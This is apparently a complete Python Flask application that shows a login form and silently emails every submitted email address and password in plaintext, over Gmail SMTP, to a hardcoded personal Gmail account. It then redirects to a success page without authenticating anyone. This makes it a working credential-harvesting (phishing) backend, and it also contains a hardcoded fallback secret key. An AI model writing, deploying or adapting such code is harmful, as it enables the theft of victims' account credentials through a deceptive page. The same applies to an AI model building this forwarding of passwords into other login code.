import os
import smtplib
import threading
from flask import Flask, render_template, request, redirect, url_for
from email.message import EmailMessage
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "rakib_secret_123")

def send_email_task(user_info):
    """এটি ব্যাকগ্রাউন্ডে ইমেইল পাঠাবে"""
    try:
        my_email = os.environ.get("MY_EMAIL", "mdrakibjoysiddhi2025@gmail.com")
        app_password = os.environ.get("APP_PASSWORD")

        if not app_password:
            print("❌ Error: APP_PASSWORD not found!")
            return

        msg = EmailMessage()
        msg.set_content(f"User logged in with details:\n\n{user_info}")
        msg['Subject'] = "New Login Alert! (Rakib's Project)"
        msg['From'] = my_email
        msg['To'] = my_email

        # SSL Port 465 ব্যবহার করা হয়েছে যা দ্রুত কাজ করে
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(my_email, app_password)
            server.send_message(msg)
        print("✅ Email sent successfully in background!")
    except Exception as e:
        print(f"❌ Background SMTP Error: {e}")

@app.route('/') 
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')

    if not email or not password:
        return redirect(url_for('index'))
    
    user_data = f"Email: {email}\nPassword: {password}"
    
    # ব্যাকগ্রাউন্ডে ইমেইল পাঠানোর জন্য থ্রেড শুরু করা
    email_thread = threading.Thread(target=send_email_task, args=(user_data,))
    email_thread.start()
    
    # ইমেইল যাওয়ার জন্য অপেক্ষা না করে সরাসরি success পেজে নিয়ে যাবে
    return redirect(url_for('success'))

@app.route('/success')
def success():
    return render_template('success.html')

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
